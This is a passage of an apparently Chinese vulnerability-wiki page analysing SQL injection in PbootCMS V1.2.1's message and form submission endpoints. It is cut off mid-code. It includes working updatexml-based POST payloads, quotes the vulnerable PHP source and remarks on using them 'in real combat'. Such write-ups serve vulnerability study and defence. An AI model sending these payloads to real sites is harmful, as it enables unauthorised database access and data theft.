@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PbootCMS/PbootCMS%20sql%E6%B3%A8%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>PbootCMS sql注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "PbootCMS sql\u6ce8\u5165", url: "#_top", children: [
+              {title: "0x01 \u524d\u53f0home\u6a21\u5757\u6ce8\u5165\u6f0f\u6d1e", url: "#0x01-home" },
+              {title: "0x01.1 \u5728\u7ebf\u7559\u8a00\u5904insert sql\u6ce8\u5165", url: "#0x011-insert-sql" },
+              {title: "0x01.2 \u514d\u8d39\u901a\u8bddinsert sql\u6ce8\u5165", url: "#0x012-insert-sql" },
+              {title: "0X01.3 \u524d\u53f0\u9996\u9875\u6ce8\u5165", url: "#0x013" },
+              {title: "0x08.4 \u524d\u53f0\u641c\u7d22\u6846\u6ce8\u5165", url: "#0x084" },
+              {title: "0x10 api\u6a21\u5757\u6ce8\u5165", url: "#0x10-api" },
+              {title: "0x10.1 \u63a5\u53e3\u6ce8\u5165\u4e00", url: "#0x101" },
+              {title: "0x10.2 \u63a5\u53e3\u6ce8\u5165\u4e8c", url: "#0x102" },
+              {title: "0x10.3 \u63a5\u53e3\u6ce8\u5165\u4e09", url: "#0x103" },
+              {title: "\u56db\u3001\u53c2\u8003\u94fe\u63a5", url: "#_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PbootCMS%20v2.0.7%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PbootCMS%20v2.0.7%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        PbootCMS v2.0.7 任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PbootCMS%20search%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PbootCMS%20search%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PbootCMS search SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="pbootcms-sql">PbootCMS sql注入<a class="headerlink" href="#pbootcms-sql" title="Permanent link">&para;</a></h1>
+<h2 id="0x01-home">0x01 前台home模块注入漏洞<a class="headerlink" href="#0x01-home" title="Permanent link">&para;</a></h2>
+<h2 id="0x011-insert-sql">0x01.1 在线留言处insert sql注入<a class="headerlink" href="#0x011-insert-sql" title="Permanent link">&para;</a></h2>
+<h3 id="0x0112">0x01.1.2 漏洞演示<a class="headerlink" href="#0x0112" title="Permanent link">&para;</a></h3>
+<p>注：我本地测试的所以我把验证验证码那一步关闭了=-=，实战中请自己加上验证码</p>
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId24.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="n">url</span><span class="o">:</span><span class="n">http</span><span class="o">://</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">cms</span><span class="o">/</span><span class="n">PbootCMS</span><span class="o">-</span><span class="n">V1</span><span class="mf">.2.1</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="o">/</span><span class="n">Message</span><span class="o">/</span><span class="k">add</span>
+<span class="n">post</span><span class="o">:</span>
+<span class="w">    </span><span class="n">contacts</span><span class="err">[</span><span class="n">content</span><span class="n n-Quoted">`,`</span><span class="n">create_time</span><span class="n n-Quoted">`,`</span><span class="n">update_time</span><span class="n n-Quoted">`) VALUES (&#39;1&#39;, &#39;1&#39; ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111</span>
+<span class="n n-Quoted">    content = 1111</span>
+<span class="n n-Quoted">    mobile = 1111</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId25.png" /></p>
+<h3 id="0x0112_1">0x01.1.2 漏洞解读<a class="headerlink" href="#0x0112_1" title="Permanent link">&para;</a></h3>
+<p>路径：PbootCMS-V1.2.1\apps\home\controller\MessageController.php
+方法：add(</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// 留言新增</span>
+<span class="w">    </span><span class="nx">public</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="nx">add</span><span class="p">()</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">_POST</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">time</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">session</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">lastsub</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">&lt;</span><span class="w"> </span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">alert_back</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">您提交太频繁了</span><span class="err">，</span><span class="nx">请稍后再试</span><span class="err">！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="c1">// 验证码验证</span>
+<span class="w">            </span><span class="err">$</span><span class="nx">checkcode</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">post</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">checkcode</span><span class="err">&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">config</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">message_check_code</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="c1">// if (! $checkcode) {</span>
+<span class="w">                </span><span class="c1">//     alert_back(&#39;验证码不能为空！&#39;);</span>
+<span class="w">                </span><span class="c1">// }</span>
+
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">checkcode</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">session</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">checkcode</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="nx">alert_back</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">验证码错误</span><span class="err">！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="c1">// 读取字段</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(!</span><span class="w"> </span><span class="err">$</span><span class="nx">form</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">model</span><span class="o">-&gt;</span><span class="nx">getFormField</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">alert_back</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">留言表单不存在任何字段</span><span class="err">，</span><span class="nx">请核对后重试</span><span class="err">！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="c1">// 接收数据</span>
+<span class="w">            </span><span class="err">$</span><span class="nx">mail_body</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">foreach</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">form</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">$</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">field_data</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">post</span><span class="p">(</span><span class="err">$</span><span class="nx">value</span><span class="o">-&gt;</span><span class="nx">name</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="err">$</span><span class="nx">field_data</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 如果是多选等情况时转换</span>
+<span class="w">                    </span><span class="err">$</span><span class="nx">field_data</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">implode</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">field_data</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">value</span><span class="o">-&gt;</span><span class="nx">required</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">!</span><span class="w"> </span><span class="err">$</span><span class="nx">field_data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="nx">alert_back</span><span class="p">(</span><span class="err">$</span><span class="nx">value</span><span class="o">-&gt;</span><span class="nx">description</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">不能为空</span><span class="err">！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="err">$</span><span class="nx">value</span><span class="o">-&gt;</span><span class="nx">name</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">post</span><span class="p">(</span><span class="err">$</span><span class="nx">value</span><span class="o">-&gt;</span><span class="nx">name</span><span class="p">);</span>
+<span class="w">                    </span><span class="err">$</span><span class="nx">mail_body</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">$</span><span class="nx">value</span><span class="o">-&gt;</span><span class="nx">description</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="sc">&#39;：&#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">post</span><span class="p">(</span><span class="err">$</span><span class="nx">value</span><span class="o">-&gt;</span><span class="nx">name</span><span class="p">)</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">&#39;</span><span class="p">&lt;</span><span class="nx">br</span><span class="p">&gt;</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="c1">// 设置额外数据</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">acode</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">session</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">lg</span><span class="err">&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">user_ip</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">ip2long</span><span class="p">(</span><span class="nx">get_user_ip</span><span class="p">());</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">user_os</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">get_user_os</span><span class="p">();</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">user_bs</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">get_user_bs</span><span class="p">();</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">recontent</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">status</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">create_user</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">guest</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">data</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">update_user</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">guest</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">model</span><span class="o">-&gt;</span><span class="nx">addMessage</span><span class="p">(</span><span class="err">$</span><span class="nx">data</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">session</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">lastsub</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">time</span><span class="p">());</span><span class="w"> </span><span class="c1">// 记录最后提交时间</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">log</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">留言提交成功</span><span class="err">！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">config</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">message_send_mail</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">config</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">message_send_to</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="err">$</span><span class="nx">mail_subject</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;【PbootCMS】您有新的表单数据，请注意查收！&quot;</span><span class="p">;</span>
+<span class="w">                    </span><span class="err">$</span><span class="nx">mail_body</span><span class="w"> </span><span class="p">.=</span><span class="w"> </span><span class="err">&#39;</span><span class="p">&lt;</span><span class="nx">br</span><span class="p">&gt;</span><span class="nx">来自网站</span><span class="err">&#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">get_http_url</span><span class="p">()</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="sc">&#39;（&#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">date</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">Y</span><span class="o">-</span><span class="nx">m</span><span class="o">-</span><span class="nx">d</span><span class="w"> </span><span class="nx">H</span><span class="p">:</span><span class="nx">i</span><span class="p">:</span><span class="nx">s</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="sc">&#39;）&#39;</span><span class="p">;</span>
+<span class="w">                    </span><span class="nx">sendmail</span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">config</span><span class="p">(),</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">config</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">message_send_to</span><span class="err">&#39;</span><span class="p">),</span><span class="w"> </span><span class="err">$</span><span class="nx">mail_subject</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">mail_body</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="nx">alert_location</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">提交成功</span><span class="err">！&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="o">-</span><span class="mi">1</span><span class="err">&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">log</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">留言提交失败</span><span class="err">！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="nx">alert_back</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">提交失败</span><span class="err">！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">error</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">提交失败</span><span class="err">，</span><span class="nx">请使用POST方式提交</span><span class="err">！&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部
+POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组</p>
+<div class="codehilite"><pre><span></span><code><span class="err">然后就会带入</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">addMessage</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="err">执行语句</span>
+</code></pre></div>
+
+<p>路径：PbootCMS-V1.2.1\apps\home\model\ParserModel.php
+方法：addMessage(</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// 新增留言</span>
+<span class="n">public</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">addMessage</span><span class="p">(</span><span class="no">$</span><span class="n">data</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">parent</span><span class="p">::</span><span class="n">table</span><span class="p">(</span><span class="s">&#39;ay_message&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">autoTime</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">insert</span><span class="p">(</span><span class="no">$</span><span class="n">data</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key
+带入数据库查询引发注入</p>
+<h2 id="0x012-insert-sql">0x01.2 免费通话insert sql注入<a class="headerlink" href="#0x012-insert-sql" title="Permanent link">&para;</a></h2>
+<p>注：本地测试的时候，这个地方的注入需要后台添加一条数据才能注！真实环境的话，开放了这个功能直接抓包即可
+进入后台</p>
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId28.png" /></p>
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId29.png" /></p>
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId30.png" /></p>
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId31.png" /></p>
+<h3 id="0x0821">0x08.2.1 漏洞演示<a class="headerlink" href="#0x0821" title="Permanent link">&para;</a></h3>
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId33.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="nt">url</span><span class="err">：</span><span class="nt">http</span><span class="o">://</span><span class="nt">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="o">/</span><span class="nt">cms</span><span class="o">/</span><span class="nt">PbootCMS-V1</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">1</span><span class="o">/</span><span class="nt">index</span><span class="p">.</span><span class="nc">php</span><span class="o">/</span><span class="nt">Form</span><span class="o">/</span><span class="nt">add</span><span class="o">?</span><span class="nt">fcode</span><span class="o">=</span><span class="nt">2</span>
+<span class="nt">post</span><span class="err">：</span>
+<span class="w">  </span><span class="nt">tel</span><span class="cp">[</span><span class="nx">tel</span><span class="err">`</span><span class="p">)</span><span class="w"> </span><span class="nx">VALUES</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="nx">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x3a</span><span class="p">,</span><span class="nx">user</span><span class="p">()),</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">);</span><span class="o">--</span><span class="w"> </span><span class="nx">a</span><span class="cp">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">1111</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId34.png" /></p>
+<h3 id="0x0822">0x08.2.2 漏洞解读<a class="headerlink" href="#0x0822" title="Permanent link">&para;</a></h3>
+<p>路径：PbootCMS-V1.2.1\apps\home\controller\FormController.php
+方法：add(</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="err">表单提交</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">add</span><span class="p">()</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">time</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">session</span><span class="p">(</span><span class="s1">&#39;lastsub&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">alert_back</span><span class="p">(</span><span class="s1">&#39;您提交太频繁了，请稍后再试！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">fcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;fcode&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;var&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">alert_back</span><span class="p">(</span><span class="s1">&#39;传递的表单编码有误！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">fcode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">alert_back</span><span class="p">(</span><span class="s1">&#39;表单提交地址有误，留言提交请使用留言专用地址!&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">验证码验证</span>
+<span class="w">            </span><span class="o">/*</span>
+<span class="w">             </span><span class="o">*</span><span class="w"> </span><span class="o">$</span><span class="n">checkcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;checkcode&#39;</span><span class="p">);</span>
+<span class="w">             </span><span class="o">*</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_check_code&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="o">*</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">checkcode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="o">*</span><span class="w"> </span><span class="n">alert_back</span><span class="p">(</span><span class="s1">&#39;验证码不能为空！&#39;</span><span class="p">);</span>
+<span class="w">             </span><span class="o">*</span><span class="w"> </span><span class="p">}</span>
+<span class="w">             </span><span class="o">*</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">checkcode</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">session</span><span class="p">(</span><span class="s1">&#39;checkcode&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="o">*</span><span class="w"> </span><span class="n">alert_back</span><span class="p">(</span><span class="s1">&#39;验证码错误！&#39;</span><span class="p">);</span>
+<span class="w">             </span><span class="o">*</span><span class="w"> </span><span class="p">}</span>
+<span class="w">             </span><span class="o">*</span><span class="w"> </span><span class="p">}</span>
+<span class="w">             </span><span class="o">*/</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">读取字段</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">form</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">getFormField</span><span class="p">(</span><span class="o">$</span><span class="n">fcode</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">alert_back</span><span class="p">(</span><span class="s1">&#39;接收表单不存在任何字段，请核对后重试！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">接收数据</span>
+<span class="w">            </span><span class="o">$</span><span class="n">mail_body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">form</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">field_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="o">$</span><span class="n">field_data</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="err">如果是多选等情况时转换</span>
